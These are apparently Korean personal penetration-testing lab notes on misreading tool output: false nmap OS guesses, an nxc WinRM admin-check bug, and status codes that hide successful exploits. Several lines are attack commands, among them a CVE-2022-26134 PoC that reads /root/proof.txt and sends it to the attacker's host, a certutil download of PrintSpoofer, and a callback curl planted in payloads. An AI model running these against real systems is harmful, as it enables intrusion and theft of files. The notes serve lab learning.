**이 박스에서는 그 위조값이 «우연히» 정답이었음 — 그래서 더 나쁨.** 맞았다는 사실이 방법을 정당화하지 않음. 화면이 말하는 버전은 근거로 **세지 말고**, 서버측 런타임 동작(라우팅 패턴·엔드포인트 존재 여부)이나 배포 산출물의 콘텐츠 해시처럼 **출제자가 고치려면 앱을 건드려야 하는 축**으로 판정할 것(A-13 의 git blob 대조).
→ 판별 절차 — 정품 배포본을 `pip download <pkg>==<ver> --no-deps` 로 받아 같은 자산의 크기·문자열을 대조. **sdist 에는 빌드된 `app.*.js` 가 없으므로 wheel 로 받아야** 이 축이 성립함.

**출처가 같으면 근거가 아니다** — 근거 3개가 같은 파일에서 나왔으면 그건 근거 1개임. ([[Hub]]에서 실패 → [[Levram]] [[RubyDome]] [[Astronaut]]에서 교정)

**SMB 공유 DACL 이 Everyone-full 로 보여도 실제 쓰기는 거부될 수 있다.** [[Bratarina]] — `rpcclient netsharegetinfo` 로 본 DACL 은 `S-1-1-0`(Everyone) full(`0x1f01ff`)인데 `smbclient put` 은 `NT_STATUS_ACCESS_DENIED`. smb.conf·파일시스템 권한이 공유 ACL 보다 우선함. **공유 ACL 만 보고 쓰기 가능하다 판단하면 시간을 태움 — 실제로 쳐볼 것.**

**`enum4linux-ng` 는 닫힌/필터 포트에서 오래 물고 늘어진다.** [[Bratarina]] — LDAP/LDAPS/NetBIOS-139 검사가 전부 타임아웃(139 는 nmap 이 이미 `filtered` 로 보고한 포트). 타임아웃을 짧게 잡을 것.

**부재 판정에 «문맥 포함 패턴»을 쓰지 말 것.** `grep -o -E '.{N}패턴.{N}'` 은 매치가 행 시작·끝 근처에 있으면 앞뒤 `.{N}` 을 못 채워 **전체가 탈락**함 — 0건이 「존재하지 않음」이 아니라 「문맥 조건을 못 채움」임. [[LazySysAdmin]] 실측: `wp_home.html` 에 `grep -o -E '.{60}togie.{60}'` → **0건**이라 「웹에는 togie 언급이 없다」로 결론내고 SMB 로 돌아갔으나, `grep -c togie` 는 **56건**이었고 스크린샷을 눈으로 보고서야 `My name is togie.` 를 발견함.
→ **부재는 문맥 없는 단순 카운트(`grep -c 패턴`)로 먼저 셀 것.** 문맥 패턴은 존재가 확인된 자리에서 «읽기 위해» 쓰는 것이지 판정용이 아님. (Kali 재실행으로 검증, 2026-08-26 — 이전 판이 이 사례를 「`grep -c` 행경계 탈락」으로 적었던 것은 **반증됨**. `grep -c` 쪽이 정답이었음.)

**배너·favicon·타이틀은 «정체»가 아님 — 그 서비스 특유의 파일을 실제로 던져 처리되는지로 확정할 것.** JSP 를 던져 실행 안 되면 Tomcat 이 아님. [[Pebbles]] 원 기록은 `/manager/html`·`/index.jsp` 404 와 `/hello.php` 가 JSP 원문을 그대로 뱉은 것을 근거로 8080 을 접었다고 적었으나, **응답 본문 산출물이 남지 않아 재확인 불가**(`[가정]`). 산출물로 확정되는 것은 세 포트의 서버 헤더가 전부 Apache 라는 것까지임. 「응답이 성공을 뜻하지 않는다」(A-12)의 짝 — **배너가 정체를 뜻하지도 않음.**

**저레이트 스캔의 서비스명도 사전 항목임.** [[Pebbles]] `nmap_lowrate_allports.log` 의 `3305/tcp odette-ftp`·`8080/tcp http-proxy` 는 `-sS` 라 배너를 안 받은 것이고, 같은 세션의 `-sCV` 가 셋 다 `Apache httpd 2.4.18` 로 확정함. 두 결과가 어긋나면 **배너를 받은 쪽**이 이김.

**nmap OS 지문에 `Warning: OSScan results may be unreliable` 이 붙으면 그 블록은 통째로 버릴 것.** 열린 포트만 있고 **닫힌 포트가 없으면** OS 지문이 성립하지 않는데도 nmap 은 퍼센트를 붙여 출력함.
[[Codo]] — 22·80 만 열린 호스트에서 `Running (JUST GUESSING): … MikroTik RouterOS 7.X (97%)`. 97% 를 믿고 라우터 익스플로잇을 뒤지면 시간을 통째로 날림. 실제 근거는 서비스 배너의 **패키지 리비전**이었음 — `OpenSSH 8.2p1 Ubuntu 4ubuntu0.7` + `Apache httpd 2.4.41 ((Ubuntu))` 둘 다 Ubuntu 20.04 focal 기본 패키지라 **독립 근거 2개로 서로를 확증**함. 셸 획득 후 `Linux codo 5.4.0-150-generic #167-Ubuntu` 가 세 번째 근거.
⚠️ 같은 배지를 [[Muddy]] 에서도 봤음(A-1-18) — 거기서는 유령 포트까지 함께 나왔음. **이 배지가 붙은 스캔은 포트 목록도 함께 의심할 것.**

⚠️ **같은 MikroTik 오탐이 [[MiddlewareBypass]] 에서 재현됨 — 패턴으로 취급할 것.** 22·3000 두 포트뿐인 호스트에서 같은 `Warning: OSScan results may be unreliable …` 와 함께 `Running (JUST GUESSING): … MikroTik RouterOS 7.X (97%)`. 실제는 Ubuntu 24.04.1 LTS(커널 6.8.0-58)이고, 독립 근거 2개(SSH 배너 `Ubuntu 3ubuntu13.11` + 로그인 후 MOTD `Ubuntu 24.04.1 LTS`)로 확정함. **닫힌 포트가 없는 스캔에서 나온 MikroTik 배지는 Codo·MiddlewareBypass 두 박스에서 반복됨.**

**커널 버전이 «실측으로» 반증된 세 번째 사례.** [[Pelican]] — nmap 은 `OS details: Linux 5.0 - 5.14` 를 냈으나 나중에 코어 덤프의 `strings` 에 커널 문자열이 그대로 찍혀 있었음:
```text
LINUX_2.6
Linux
4.19.0-10-amd64
```
실제는 **4.19.0-10-amd64(Debian 10 buster)** 였고, SSH 배너 `OpenSSH 7.9p1 Debian 10+deb10u2` 와도 일치함 — 즉 ②(배너)만 읽었어도 ④를 버릴 수 있었음. ⚠️ **이 오탐을 믿고 커널 익스플로잇을 고르면 컴파일 시간이 통째로 날아감**([[Sorcerer]] 사례는 B-24).

**서비스 «이름»이 오탐이어도 그 아래 `SF-Port…-TCP:` 지문 블록에는 진짜 정보가 있음.** 이름은 버리되 지문은 디코드할 것.
[[Jacko]] — `9092/tcp open XmlIpcRegSvc?` 는 오탐이고, 지문을 풀면 `org.h2.jdbc.JdbcSQLNonTransientConnectionException: Remote connections to this server are not allowed, see -tcpAllowOthers [90117-199]` 가 나옴.
- `\0R\0e\0m\0o\0t\0e…` 처럼 **글자마다 «앞»에** `\0` 이 붙으면 **UTF-16BE** 임(널바이트가 뒤가 아니라 앞). 엔디언을 반대로 잡으면 같은 바이트가 `刀攀洀漀琀攀` 같은 CJK 로 풀림 — `python3 -c "print(bytes.fromhex('…').decode('utf-16-be'))"` 로 때려보는 편이 눈으로 세는 것보다 빠름
- 얻은 것 둘 — ① **막다른 길 하나를 지움**(9092 는 H2 TCP 서버인데 원격 접속이 꺼져 있어 JDBC 직결 시도가 무의미) ② **버전 판정 근거 1개**(꼬리 `-199` 가 콘솔의 `1.4.199` 와 일치). ⚠️ H2 가 예외 메시지에 `[에러코드-빌드번호]` 를 붙인다는 관례 자체는 미확인이고 **두 값이 맞았다는 관측만 있음** `[가정]`
- ⚠️ 같은 박스의 `whatweb` 은 nmap 이 준 것 이상을 주지 않았음 — 자동 판정은 **보조**이지 근거가 아님

**⚠️ 값이 서로 안 맞으면 도구를 의심하기 전에 «파일이 정지 상태인가»부터 볼 것.** [[Flimsy]] — nginx access.log 의 우리 IP 행수를 세 번 세었는데 매번 달랐음.

| 시각(KST) | 값 | 어디서 |
|---|---|---|
| 21:35 | 395,013 | `traces_confirmed.log` — `### nginx access (80) my hits` |
| 21:36 | 419,537 | `traces_nginx.log` — `wc -l` 로 전체 행수 |
| 21:36 | 419,573 | `traces_nginx.log` — `grep -F` 로 우리 IP 행 |

「`grep -c` 가 이상한 값을 줘서 `grep -F` 로 다시 셌다」로 읽기 쉬우나 **틀림.** 세 값의 차이는 grep 종류가 아니라 **로그가 계속 자라고 있었던 것**임 — 1분 사이 24,560행이 늘었고(≈400 req/s), `wc -l` 보다 `grep -F` 가 36행 많은 것도 두 명령 사이 몇 초 차이임. **우리 IP 행이 전체 행수보다 많다는 것 자체가 「파일이 움직이고 있다」는 신호**였음. 원인은 실제 줄을 눈으로 봐서 확정함 — 21:23 에 켠 gobuster 가 계속 돌고 있었음:
```text
192.168.45.207 - - [20/Aug/2026:12:23:41 +0000] "GET /15a7cc66-f735-4b27-b0a7-414898cd12b3 HTTP/1.1" 404 134 "-" "gobuster/3.8"
```
— 출처: `~/PG/Flimsy/traces_nginx.log`
→ **로그를 세는 동안 로그가 자라면 어떤 카운트도 스냅샷이 아님.**
→ **부수 교훈 — 정찰 도구를 끄는 것도 절차임.** 경로가 43500 으로 확정된 21:25 에 껐어야 했는데 21:38 까지 방치해 43MB·419,573행을 남겼음. 실무였다면 그 시점에 작전이 끝남(C-5).

**`OSScan … unreliable` 배지가 «없어도» OS 추측은 틀림.** [[pyLoader]] — 22·9666 두 포트에 닫힌 포트가 65533개나 있어 지문 조건이 갖춰졌는데도 `Running: Linux 5.X, MikroTik RouterOS 7.X` / `OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)` 를 냈음. 실제는 **Ubuntu 22.04 / 커널 5.15.0-75**. 홉이 4개(가상화·NAT)를 지나며 스택 지문이 뭉개진 것. MikroTik 을 믿고 RouterOS 익스플로잇(Winbox CVE 등)을 뒤졌다면 막다른 길이었음 — **RouterOS 는 8291/8728 을 쓰는데 그 포트가 열려 있지도 않았음.**

**OS 판정 근거는 강한 것부터 이 순서로 세울 것:**
```text
① 애플리케이션이 렌더한 uname 문자열        ← 최상. pyLoader: "Linux pyloader 5.15.0-75-generic #82-Ubuntu"
② 서비스 배너의 배포판 패키지 리비전         ← 매우 강함. "OpenSSH 8.9p1 Ubuntu 3ubuntu0.1"
③ HTTP 서버 헤더 / 기본 페이지               ← 중간
④ nmap -O / -A 의 TCP 스택 지문             ← 가장 약함. 홉이 많으면 자주 틀림
```
**④가 ①~③과 충돌하면 ④를 버릴 것.** ①과 ②가 서로 다른 출처면 그대로 「독립 근거 2개」가 됨.


[[Flu]] — `8091/tcp open jamlink?` 를 보고 `searchsploit jamlink` 를 실제로 침. 결과 0건.
```text
searchsploit jamlink
```
— 출처: `~/.zsh_history`
`jamlink` 은 `nmap-services` 의 8091 포트 이름이고 **빈도값이 `0.000000`** — 실측 표본에서 사실상 관측된 적 없는 항목임. 놓친 진짜 단서는 **같은 출력 안**에 있었음(`Server: Aleph/0.4.6`).

**nmap 출력에서 검색어를 뽑는 우선순위:**
1. `fingerprint-strings` 안의 `Server:` / 배너 문자열 ← 실측된 것
2. `http-title`·NSE 스크립트 출력 ← 실측된 것
3. VERSION 열 ← 실측된 것
4. ~~SERVICE 열에 `?` 가 붙은 이름~~ ← **실측이 아님. 포트 번호로 조회한 표 이름임**

소요 시간은 1~2분이었으나, 이 습관이 없으면 **없는 제품의 CVE 를 30분 찾음.**
⚠️ **다만 Flu 에서 CVE 로 실제 이어진 경로는 `8091/tcp open jamlink` 를 통째로 «웹» 검색한 것이었음** — 실습 저장소 문서가 상위에 떠 CVE-2022-26134 를 알려줌. **결과가 맞았다고 절차가 맞은 것은 아님**(같은 문자열의 `searchsploit` 은 0건). 재현 가능한 절차는 위 1~3 임.

**②(서비스 배너의 배포판 패키지 리비전)는 조회하면 릴리스가 «특정»된다 — 「요즘 LTS 겠지」로 건너뛰지 말 것.**
[[Flu]] — 1차 세션이 `OpenSSH 9.0p1 Ubuntu 1ubuntu8.5` 를 보고 「22.04 계열」로 추정했으나 실제는 **Ubuntu 23.04 / kernel 6.2.0-39-generic** 이었음(2차 세션 `uname -a`·`/etc/os-release` 로 반증). Launchpad 조회로 확인:
```text
== jammy
1:8.9p1-3ubuntu0.16 Updates
1:8.9p1-3 Release
== lunar
1:9.0p1-1ubuntu8.7 Updates
1:9.0p1-1ubuntu8 Release
```
22.04(jammy)는 `8.9p1-3ubuntu0.x`, 23.04(lunar)가 `9.0p1-1ubuntu8.x` — 타겟 배너는 **패키지 리비전까지 lunar 와 정확히 맞음.**
같은 박스의 nmap `④` 도 빗나갔음 — `Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5` 인데 실제 6.2 였음(열린 포트 3개라 지문 표본이 빈약). **MikroTik 오탐 사례가 [[Codo]]·[[MiddlewareBypass]]·[[pyLoader]] 에 이어 네 번째임.**
→ 커널 익스플로잇을 고른다면 이 오차가 그대로 실패임. 셸을 잡은 뒤에는 `uname -a` 로 확정할 것.


**nxc 의 WinRM `(Pwn3d!)` 는 관리자 판정이 아니다 — 소스가 무조건 참을 반환한다.** [[Heist]] — `WINRM … heist.offsec\enox:california (Pwn3d!)` 가 떴으나 BloodHound 상 `enox` 는 `Administrators` 멤버가 아니었음(`-512`·`-519`·`-500` 셋뿐). Kali nxc 소스가 이유임:

```bash
┌──(kali㉿kali)-[~]
└─$ sed -n '122,134p' /usr/lib/python3/dist-packages/nxc/protocols/winrm.py
    def check_if_admin(self):
        wsman = self.conn.wsman
        wsen = NAMESPACES["wsen"]
        wsmn = NAMESPACES["wsman"]

        enum_msg = ET.Element(f"{{{wsen}}}Enumerate")
        ET.SubElement(enum_msg, f"{{{wsmn}}}OptimizeEnumeration")
        ET.SubElement(enum_msg, f"{{{wsmn}}}MaxElements").text = "32000"

        wsman.enumerate("http://schemas.microsoft.com/wbem/wsman/1/windows/shell", enum_msg)
        self.admin_privs = True
        return True
```
`wsman.enumerate()` 결과를 보지 않고 `admin_privs = True` 를 대입함. **WinRM 줄의 `(Pwn3d!)` = 「WinRM 인증이 됐다」일 뿐임.** 관리자 판정으로 읽으면 「왜 `proof.txt` 가 안 읽히지」에 시간을 태움.
→ **실제 판정 근거는 같은 스윕의 SMB 줄임** — `ADMIN$`·`C$` 에 권한 표시가 없으면 로컬 관리자가 아님. **SMB 줄의 `(Pwn3d!)` 는 `ADMIN$` 접근 성공을 실제로 확인하므로 신뢰할 수 있음.**

#### A-12. 응답이 성공을 뜻하지 않는다

**타임아웃·`HTTP=000`·`200`+로그인페이지·무응답 전부 성공 사례였음. 리스너와 부작용을 볼 것.** ([[Crane]] [[RubyDome]] [[Astronaut]] [[Exghost]])

**권한상승 판** — 실패한 익스플로잇도 셸 프롬프트를 띄움. 돌린 직후 **`id` 로 판정**할 것. ([[plum]] — exim 익스플로잇이 실패했는데 셸이 떠서 성공처럼 보였음)

**Windows 판 — 다운로드 도구의 「성공」도 마찬가지임.** [[Squid]] — `certutil -urlcache -f <URL> PrintSpoofer64.exe`(상대경로)가 `CertUtil: -URLCache command completed successfully.` 를 반환했는데 `dir` 로 확인하니 파일이 없었음. 전송 도구의 배너는 판정 근거가 아니고 `dir`·`certutil -hashfile` 이 판정임(B-82).

**폼 POST 판 — 200 이 실패이고 302 가 성공인 앱이 있음.** [[Assignment]]: Gogs 저장소 생성에 `-d "uid=1"` 로 보내니 **HTTP 200** 이 돌아왔고 에러 문구도 없었음(조용한 실패). 폼 원문을 다시 읽으니 0.12.9 의 필드명은 `user_id` 였음:
```text
<input type="hidden" id="user_id" name="user_id" value="1" required>
```
고치니 **302 + `Location: /jane/pgtest`**. 실패는 27KB 폼 재표시(`~/PG/Assignment/manual/repo_create.html`·`repo_form.html`), 성공은 0바이트(`repo_create2.html`).
→ **필드명은 문서나 기억이 아니라 «그 인스턴스의 폼 HTML» 에서 뽑을 것.**

**500 이 실패를 뜻하지 않음 — 디버그 모드에서는 예외 메시지가 «출력 채널»임.** [[Fractal]]: Symfony `_fragment` 컨트롤러는 **성공해도 HTTP 500** 이고, `shell_exec` 가 통한 응답의 명령 출력이 `LogicException: The controller must return a response (... given)` 메시지 «안»에 들어 있었음. 상태코드로 판정했으면 정답을 실패로 버렸을 자리.

**스크립트 크래시 ≠ 익스플로잇 실패 — 로그가 «어느 단계까지» 갔는지와 타겟 상태로 판정할 것.** [[Wombo]] `verify_run.log` 는 `Loading module...` 이 찍힌 **뒤에** 죽음:
```text
[info] Setting master...
[info] Setting dbfilename...
[info] Loading module...
[info] Temerory cleaning up...
[err ] UnicodeDecodeError('gb18030', b'$300\r\n...', 16, 17, 'illegal multibyte sequence')
```
`redis-rogue-server.py` 의 `din()` 이 소켓 응답을 `.decode('gb18030')` 로 풀려다 RDB 바이너리에서 죽는 것 — **모듈은 이미 심겨 있었음.** 결과로 판정(`module_list.txt` 의 `name / system / ver / 1`)하고, 그다음은 스크립트의 대화형 셸에 기대지 말고 `redis-cli … system.exec` 로 **모듈을 직접 몰 것.**
→ 일반화: 국산·중문 PoC 는 하드코딩된 인코딩(`gb18030`·`gbk`)으로 바이너리 응답을 디코드하다 죽는 경우가 흔함. **크래시 지점이 「페이로드 전달 이후」면 타겟 상태부터 확인할 것.**

**WordPress `wp-login.php` 도 같은 판정임 — 성공이 302, 실패가 200.** 성공은 `302 Found` + `Location: .../wp-admin/`, 실패는 `200 OK` 로 로그인 폼을 다시 그림. **본문 길이나 "Error" 문자열을 찾을 필요 없이 상태코드 한 줄로 수동 판정됨**(자동 도구 불필요). [[LazySysAdmin]] 실측 — `Admin:TogieMYSQL12345^^` → 302(성공) / `togie:12345` → 200(실패). 같은 박스에서 `togie:12345` 는 **SSH 로는 통했음** — 계정별로 WP 비번과 시스템 비번이 달랐던 것(A-24).

**`curl` 이 응답 없이 «매달리는» 것 자체가 성공 신호일 수 있음.** RCE 페이로드를 던진 직후 응답이 안 오면 서버 프로세스가 리버스셸에 블록돼 HTTP 응답을 못 돌려주는 것 — **응답창이 아니라 리스너창을 볼 것.** [[Exghost]] 실측: `curl -F 'myFile=@image.jpg' .../exiftest.php` 가 멈춰 「페이로드가 깨졌거나 서버가 죽었다」고 봤으나, 그 순간 리스너에는 이미 셸이 붙어 있었음(exiftool 이 리버스셸에 블록되어 PHP 가 반환 못 함). `curl --max-time N` 을 걸어 **매달림 자체를 타임박스 신호**로 삼을 것.

**SMTP 판 — 거절(`554`)·수락(`250`)·무응답 셋 다 명령은 실행됐음.** [[ClamAV]] clamav-milter 명령 주입(CVE-2007-4560):
- `554 5.7.1 virus Eicar-Test-Signature detected by ClamAV` 를 받은 try1 — 그런데도 `GET /probe1` 이 Kali HTTP 로그에 도착(`http_stager.log` 14:25:18). **메일이 거절돼도 milter 의 `popen` 은 이미 돌았음**
- `250 2.0.0 … Message accepted for delivery` 를 받은 try13 — `GET /q.sh 200` 도착
- **`.` 이후 «무응답»으로 끝난 try14 가 root 대화형 셸이었음.** 무응답은 실패가 아니라 **주입한 명령이 아직 안 끝났다**는 신호임(리버스셸이 붙어 있어 sendmail 이 응답을 못 줌)

**쌍둥이 명제 — 실패 응답이 「취약하지 않음」을 뜻하지도 않음.** 트래버설이 404 를 뱉으면 서버가 안전한 것이 아니라 **내 클라이언트가 페이로드를 먼저 망가뜨린 것**일 수 있음(curl 이 `../` 를 정규화). 404 는 「그 파일이 없다」는 지극히 평범한 응답이라 **실패 신호가 정상 응답의 모습을 하고 있는 것**이 이 함정의 본체임. 확인 순서는 B-14.

⚠️ **무응답이 「큐 적재」를 뜻하지도 않음.** `.` 이후 무응답은 try2·try4·try5·try7·try14 **5건**인데 셸에서 본 `/var/spool/mqueue` 에는 `df*` **3건**(05:26·05:29·05:29)뿐이었음 — try2·try4·try5 와만 시각이 맞음. try7(05:30:53)·try14(05:35:09)은 무응답인데 큐에 없었음. **「무응답 → 큐에 남는다」로 일반화하지 말 것.**

**API 판 — HTTP 200 인데 본문은 404 JSON 임.** [[Exfiltrated]] — Subrion CMS 는 상태 코드를 항상 200 으로 주면서 존재하지 않는 라우트에는 JSON 으로 404 를 실어 보냄:
```bash
curl -s http://exfiltrated.offsec/package.json
{"error":true,"message":"Requested URL not found.","code":404,"result":true}
```
— 이 curl 자체의 raw 로그는 `~/PG/Exfiltrated/` 에 없음(노트 원문 기록을 옮긴 것). 같은 「200 인데 빈 응답」 패턴은 `~/PG/Exfiltrated/gobuster_files.txt` 의 `/actions.php`·`/actions.txt` 등 다수 `Status: 200 Size: 0` 항목에서 별도로 확인됨.
상태 코드만 보는 스캐너는 이런 응답을 전부 히트로 잡음. **실전 대응은 열거 후 «응답 크기로 정렬»해 다수를 차지하는 크기(=템플릿 오류 페이지)를 필터에 넣는 것** — gobuster `--exclude-length`, ffuf `-fs`(A-1-13 의 크기 집계와 같은 수법). 상태 코드는 전송 계층의 결과이고 성공·실패는 애플리케이션 계층의 의미임.

**쌍둥이 판 — 200 OK + «멀쩡한 산출물»이 가장 조용한 실패임.** [[RubyDome]] PDFKit 명령주입은 회피 스위치(`%20`)가 소실되면 백틱이 `%60` 으로 이스케이프되어 **에러 없이 정상 PDF 가 돌아옴.** 공개 PoC 를 복붙했는데 200 과 정상 결과물만 오면 「취약하지 않다」가 아니라 **「전송 계층이 페이로드를 이미 디코드했다」를 먼저 의심**할 것(A-2-30).

**그 판정을 응답 «본문»에서 직접 뽑을 수 있는 경우가 있음.** [[RubyDome]] 은 development 모드라 에러 페이지 첫 줄에 **조립된 명령행 전체**가 실렸음:
```text
PDFKit::ImproperWkhtmltopdfExitStatus: Command failed (exitstatus=1): /usr/local/bin/wkhtmltopdf --quiet --page-size Letter ... --encoding UTF-8 "http://%20%60id%60" page.pdf
```
— 출처: `~/PG/RubyDome/err.html`(태그 0개인 평문 응답)

`%60` 이 보이는 순간 「주입이 도달하지 못했다」가 확정됨 — 리버스셸을 던져보며 추측할 필요가 없었음. **디버그 에러 페이지는 실패 원인의 «출력 채널»임.**

**「응답 없음」이 성공인 경우 — [[Crane]](CVE-2022-23940 역직렬화 RCE).** `exploit.py` 가 `INFO:CVE-2022-23940:Login did work - Trying to create scheduled report` 를 찍고 **그대로 굳어 타임아웃**됨. 완전한 실패로 보이는 화면임. 전형적 오판 흐름 — 스크립트 실패 → 페이로드 문법 의심 → base64 재생성 → 다른 PoC 저장소 탐색 → 익스플로잇 소스 수정. **여기서 30분이 날아감.** 실제 원인은 성공이었음:
- 역직렬화가 `Save` POST 를 처리하는 «도중» 인라인으로 발화함
- `system()` 이 리버스셸을 띄우고 그 프로세스가 HTTP 요청 스레드를 붙잡음
- 그래서 **HTTP 응답이 영영 반환되지 않음** → 스크립트 대기 → 타임아웃. 스크립트 마지막의 `action=run` 트리거까지 갈 필요조차 없었음

**진단법 — 스크립트의 로그 «순서»를 읽을 것.** `exploit.py` 는 저 INFO 직후 Save POST 를 보내고, 응답이 오면 `Succesfully created scheduled report with id …` 를 찍음. 그 줄이 안 나왔다 = Save POST 가 반환되지 않았다.
→ **익스플로잇을 던진 직후 확인 순서는 ① 리스너 → ② 스크립트 출력.** 거꾸로 하면 성공을 실패로 오독함. 응답도 받고 셸도 받고 싶으면 페이로드를 백그라운드로 분리할 것 — `… | bash &` 또는 `nohup … &`([[Hawat]] 가 `bash -c "…" &` 를 쓴 이유).

⚠️ **로그인 성공·실패 판정도 같은 축임** — 상태코드와 `Location` 헤더로 할 것. [[Crane]] 의 SuiteCRM 은 실패 시 `Location: index.php?module=Users&action=Login&loginErrorMessage=…` 로 되돌림. 200 본문 길이 비교보다 확실함. **200 이 성공이 아니고 302 가 실패가 아님 — 어디로 보내는지를 볼 것.**

**취약점이 인가 게이트 «앞»에 있으면 앱은 자기 관점에서 «정상적으로» 요청을 거절함 — 그 거절이 응답에 그대로 나타남.** 공격 성패와 응답 내용은 애초에 상관관계가 없음.

[[Astronaut]] CVE-2021-21425 — `POST /admin/config/scheduler` 의 처리 순서가 ①라우팅 → ②nonce 검증 → ③`task=SaveDefault` 실행(**YAML 이 이미 기록됨**) → ④인증·인가 확인 실패 → ⑤로그인 페이지 렌더(HTTP 200) 임. 본체는 **③과 ④의 순서가 뒤바뀐 것**이고, 정상 설계라면 ④가 ②보다도 앞에 와야 함.

```text
공격자가 보는 것        : HTTP 200 + Grav Admin Login 페이지 (= 거절당한 것처럼 보임)
서버에서 실제 일어난 일 : scheduler.yaml 이 이미 덮어써짐
```
`[가정]` 위 ①~⑤ 는 관측된 동작과 익스플로잇 동작에서 역산한 흐름임 — 타겟 정지로 컨트롤러 원문 재확인 불가. **확정 사실은 「비인증 POST 후 응답은 로그인 페이지(200)였고, 60초 뒤 잡이 실행되어 셸이 붙었다」까지임.**

**같은 구조로 생기는 것들** — 인증 필터 «앞»에 붙은 로깅·감사 훅, 미들웨어 순서가 잘못된 프레임워크 설정, `beforeAction` 이 아니라 `afterAction` 에 둔 권한 체크, Spring `@PreAuthorize` 누락.

⚠️ **취약점 «이름»에 이미 답이 있는 경우가 많음** — `Unauthenticated Arbitrary YAML Write` 는 「비인증으로 쓸 수 있다」이므로 인증 실패 응답이 나오는 것이 오히려 자연스러움.
→ **익스플로잇을 던지기 전에 「성공했을 때 응답이 어떻게 보일 것인가」를 먼저 예측해 둘 것.** 예측이 안 서면 CVE 를 이해 못 한 것이고, 그 상태로 던지면 결과를 해석할 수 없음.

**이 클래스를 «CVE 가 없는 커스텀 앱»에서 찾아내는 절차** — 시험에는 CVE 번호가 없음. 비용은 엔드포인트당 10초임.
1. **관리 화면의 「동작」 엔드포인트를 목록화함** — 로그인 페이지 HTML 만으로도 상당 부분이 드러남(`<form action=…>` · `task=`/`action=`/`op=` 파라미터 · JS 번들 안의 라우트 문자열)
2. **비인증 상태로 그대로 때림 — 응답은 보지 않음.** 302 든 200 이든 403 이든 판정 재료가 아님
3. **부작용 채널을 «미리» 붙여 둠** — ⓐ같은 설정을 읽는 다른 경로(공개 API·페이지 렌더 결과)를 전후 비교 ⓑ페이로드에 `curl http://<내IP>/ping` 을 심고 액세스 로그를 오라클로 씀(B-87) ⓒ`sleep 5` 를 심어 «다음 발화 시점»의 지연으로 확인 ⓓ리스너는 항상 켜 둠
4. **인가 게이트의 «위치»를 역산함** — `GET` 은 로그인 페이지인데 `POST` 의 부작용만 남으면 게이트가 렌더 직전·태스크 디스패치 뒤에 있다는 뜻이고 그것이 이 취약점의 지문임

```bash
curl -s http://TARGET/admin | grep -oE '(action|href)="[^"]+"' | sort -u
curl -s http://TARGET/admin/js/app.js | grep -oE '"/[a-z0-9/_-]{4,}"' | sort -u
```
⛔ **이 절차의 본체는 「응답을 보지 않는 습관」임.** 사람은 200 이면 기뻐하고 403 이면 접음 — 인가 게이트 «앞»의 부작용 취약점은 정확히 그 습관을 이용해 숨음.


**판정 근거 둘** — ⑴ `id` 의 `uid=0` ⑵ 스크립트가 뱉는 `ls -l /tmp/pwned` 가 `-rwsr-xr-x`(**s**)인가. `-rwxr-xr-x` 면 실패임.
**실패의 물증은 에러 문구의 «접두사»가 알려줌.** [[plum]] 의 리버스셸 전사에 `cd www-data` / `/tmp/pwned: 8: cd: can't cd to www-data` 라는 설명되지 않는 줄이 있었고, 접두사 `/tmp/pwned:`(= `$0`)가 **`/tmp/pwned` 자체가 셸**임을 말해줌 — 즉 `raptor_exim_wiz` 의 `cp /bin/sh /tmp/pwned` 폴백 가지가 돌았다는 뜻임(= 컴파일 실패, B-86). Kali 재현:
```bash
cp /bin/dash /tmp/pwned_test
printf 'echo a\necho b\necho c\necho d\necho e\necho f\necho g\ncd www-data\n' | /tmp/pwned_test
```
```text
/tmp/pwned_test: 8: cd: can't cd to www-data      ← 원문과 완전히 같은 형식
```
`bash` 는 형식이 다름(`bash: line 1: cd: www-data: No such file or directory`) — **에러 형식만으로 dash/bash 를 가름.**


**거울상 — 무응답이 실패를 뜻하지도 않음.**
[[Flu]] — CVE-2022-26134 PoC 의 `--read-file` 은 **파일을 HTTP 응답으로 돌려주지 않고** 타겟이 Kali 로 별도 TCP 를 열어 밀어 넣는 구조임. JS 실행 순서가 **`readAllBytes()` → `new java.net.Socket()`** 이라 **읽기 권한이 없으면 소켓이 아예 안 만들어짐** — 리스너는 연결조차 못 받고 조용히 앉아 있음.
```text
python through_the_wire.py --rhost 192.168.103.41 --rport 8090 --lhost 192.168.45.244 --protocol http:// --read-file /root/proof.txt
```
— 출처: `~/.zsh_history` (`/etc/passwd` 성공 «바로 다음» 명령)
**성공했을 때와 화면이 거의 같음** — 배너도 `[+] Sending expoit at ...` 도 `listening on ...` 도 전부 동일하고, 다른 것은 그 뒤에 아무 줄도 안 붙는다는 것뿐임. 그래서 「이 익스플로잇은 파일 읽기가 불안정한가 보다」로 오독하기 쉬움. 실제 의미는 **「권한이 없다 = 권한상승이 필요하다」** 였음.
- ❌ 「파일이 없다」 · ❌ 「익스플로잇이 안 통한다」 · ✅ **「읽으려다 예외가 났다」**
⚠️ 이 실행의 출력은 남아 있지 않음. 결과가 무엇이었을지는 **PoC 소스의 실행 순서에서 확정**한 것임.
→ **판별법 — 읽을 수 있는 게 확실한 파일로 대조군을 세울 것.** `/etc/passwd` 가 오면 프리미티브는 멀쩡한 것이고, 그 상태에서 목표 파일만 안 오면 원인이 권한 하나로 좁혀짐.
→ 2차 세션에서 정확한 이유가 밝혀짐 — `/root/proof.txt` 자체는 **`0644`** 였고 막은 것은 **`/root` 의 `0700`** 이었음.


**가장 극단 — 응답도 종료 코드도 «아무 신호가 없는» 익스플로잇.** [[Algernon]] EDB 49216 은 `print` 문이 **0개**이고 `s.send(msg)` 후 `s.close()` 가 전부라, 성공해도 실패해도 **출력 0줄 · 종료 코드 0** 임. 종료 코드 0 이 뜻하는 것은 「TCP 연결이 맺어지고 바이트를 write 했다」뿐이고 서버가 그것을 파싱했는지·가젯이 돌았는지는 아무것도 검증하지 않음.
→ **판정을 전적으로 부수 효과(리스너)에 위임할 것.** 절차: ①발사 «전» `ss -lntp` 로 리스너 확인 ②발사 직후 리스너 페인 확인 ③15~20초 대기(프로세스 생성 + TCP 왕복) ④없으면 원인 후보를 하나씩 제거.
→ **가장 확실한 것은 스크립트에 진단을 직접 넣는 것임:**
```python
print(f'[+] payload len = {len(payload)}')
print(f'[+] uri = {uri}')
print(f'[+] sending {len(msg)} bytes to {HOST}:{PORT}')
s.send(msg)
print('[+] sent, closing')
s.close()
```
와이어에서도 동시에 확인:
```bash
sudo tcpdump -i tun0 -n "host <타겟> and (port 17001 or port 80)" -c 50
```

